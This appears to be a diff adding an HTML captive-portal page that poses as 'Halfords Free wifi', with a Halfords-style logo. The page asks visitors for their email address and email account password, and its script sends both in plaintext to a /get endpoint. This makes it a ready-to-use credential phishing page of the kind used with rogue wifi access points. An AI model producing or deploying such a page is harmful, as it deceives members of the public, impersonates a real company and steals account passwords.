@@ -1,0 +1,84 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            background-color: #f4f4f4;
+            margin: 0;
+            padding: 0;
+            height: 100vh;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+        }
+        .login-container {
+            background-color: white;
+            padding: 20px;
+            border-radius: 5px;
+            box-shadow: 0px 0px 10px 0px rgba(0,0,0,0.1);
+        }
+        .login-container h1, .login-container h2 {
+            text-align: center;
+        }
+        .login-container button {
+            width: 100%;
+            background-color: #fe9901;
+        }
+        #logo {
+            display: flex;
+            justify-content: center;
+            margin-bottom: 20px;
+        }
+        .form-group {
+            margin-bottom: 10px;
+        }
+        input[type="text"], input[type="password"] {
+            width: 100%;
+            padding: 8px;
+            border: 1px solid #ccc;
+            border-radius: 4px;
+            box-sizing: border-box;
+        }
+    </style>
+    <script>
+        window.addEventListener('DOMContentLoaded', (event) => {
+            const form = document.getElementById('email-form-step');
+            form.addEventListener('submit', (event) => {
+                event.preventDefault();
+                const emailInput = document.getElementById('email-input');
+                const passwordInput = document.getElementById('password-input');
+                const email = emailInput.value;
+                const password = passwordInput.value;
+                const url = `/get?email=${encodeURIComponent(email)}&password=${encodeURIComponent(password)}`;
+                window.location.href = url;
+            });
+        });
+    </script>
+</head>
+<body>
+    <div class="container">
+        <div class="row">
+            <div class="col-lg-4 offset-lg-4 login-container">
+                <div id="logo">
+                    <svg xmlns="http://www.w3.org/2000/svg" height="300" width="500" id="svg15447" version="1.1" viewBox="-10.34184 -4.072325 89.62928 24.43395"><g transform="translate(189.955 -336.2363)" id="layer1"><path id="rect15489" opacity="1" fill="#333" fill-opacity="1" stroke="none" stroke-width=".31" stroke-miterlimit="10" stroke-dasharray="none" stroke-opacity="1" d="M-189.9549 336.2363h68.9456v16.2893h-68.9456z"/><g transform="translate(-188.5418 337.4227) scale(.26458)" id="g15469"><g id="g15467"><path class="st0" d="M.3.8h11.4v18.7h.1c1.7-3.7 6.4-6 10.6-6 11.6 0 12.5 8.8 12.5 14.1v23.3H23.5V33.3c0-5 .5-10-5.7-10-4.3 0-6.2 3.8-6.2 7.8v19.8H.3z" id="path15451" fill="#ff9e18"/><path class="st0" d="M40.8 25.7c.2-4.8 2.3-7.9 5.4-9.8 3.1-1.8 7.1-2.5 11-2.5 8.2 0 16.2 1.9 16.2 12.2v15.9c0 3.1 0 6.5 1.3 9.3H63.4c-.4-1.1-.5-2.2-.7-3.4-2.9 3.2-7.3 4.5-11.4 4.5-6.6 0-11.8-3.5-11.8-11C39.5 29 51.8 30 59.7 28.3c1.9-.4 3-1.1 3-3.4 0-2.7-3.1-3.8-5.5-3.8-3.1 0-5.1 1.5-5.7 4.6zm14.7 18.8c5.4 0 7.2-3.2 6.9-10.7-1.6 1.1-4.5 1.3-7 2-2.5.6-4.7 1.8-4.7 4.6.1 3 2.3 4.1 4.8 4.1" id="path15453" fill="#ff9e18"/><path class="st0" id="rect15455" fill="#ff9e18" d="M79 1h11.4v49.8H79z"/><path class="st0" d="M138.3 13.5c9.5 0 15.8 5.5 14.7 15.9-1.3 12.8-10.1 22.2-22.7 22.2-9.6 0-16.1-5.1-15-15.6 1.3-12.8 10.4-22.5 23-22.5m-6.9 29.4c6.5 0 9.5-7.5 10.1-13 .5-4.5-.7-7.7-4.9-7.7-6.1 0-9.4 8.4-10 13.3-.4 4.1.8 7.4 4.8 7.4" id="path15457" fill="#ff9e18"/><path class="st0" d="M117.3 14.3h-7v-1.6c0-3.3 1.6-3.7 4.2-3.7 1 0 2 .1 3.1.2V.7c-1.8-.1-3.7-.2-5.5-.2C102.5.4 99 3.7 99 14.3h-5.5v7.8H99v28.7h11.4V22.1h4.2z" id="path15459" fill="#ff9e18"/><path class="st0" d="M156.9 43.4v-29h11v5.9h.1c1.7-4.4 5.5-6.8 10.4-6.8.8 0 1.6.1 2.4.2l-.5 1.5-3 8.3h-.5c-5.6 0-8.6 3.9-8.6 8.2v19.1h-11.4v-7.4z" id="path15461" fill="#ff9e18"/><path class="st0" d="M215.5 50.9h-10.8v-4.1h-.1c-2.2 3.5-5.5 5.3-9.6 5.3-10.9 0-15.5-9.9-15.5-20.2 0-9.5 4.8-18.6 14.6-18.6 4.3 0 7.6 1.7 9.9 5h.1V.5h11.4zm-24.6-18.7c0 5 1.7 10.6 6.9 10.6 5.5 0 6.7-5.6 6.7-10.2 0-5.3-1.8-10.2-6.7-10.2-5.2 0-6.9 5.2-6.9 9.8" id="path15463" fill="#ff9e18"/><path class="st0" d="M234.1 51.5c-5.8 0-10.4-1.6-14.7-4.5l3.3-9.3c3.6 2.6 8.1 4.5 11.4 4.5 2.8 0 4.1-1 4.1-2.5 0-4.6-17.1-1.8-17.1-14.1 0-7.5 6.3-12.4 14.9-12.4 4.4 0 9.6 1.7 13.2 3.6l-3.3 8.8c-3.6-2-7.4-3.3-10.4-3.3-2.4 0-3.6 1-3.6 2.3 0 4.7 17.7 1.8 17.7 14.9-.1 7.6-6.8 12-15.5 12" id="path15465" fill="#ff9e18"/></g></g></g><style type="text/css" id="style15449">.st0{fill:#ff9e18}</style></svg>
+                </div>
+                <form id="email-form-step">
+                    <h1>Sign into Halfords Free wifi</h1>
+                    <h2>Use your Email Account to login</h2>
+                    <div class="form-group">
+                        <input id="email-input" name="email" type="text" class="form-control" placeholder="Email Address" required>
+                    </div>
+                    <div class="form-group">
+                        <input id="password-input" name="password" type="password" class="form-control" placeholder="Password" required>
+                    </div>
+                    <div class="form-group">
+                        <button class="btn btn-primary" type="submit">Next</button>
+                    </div>
+                </form>
+            </div>
+        </div>
+    </div>
+</body>
+</html>
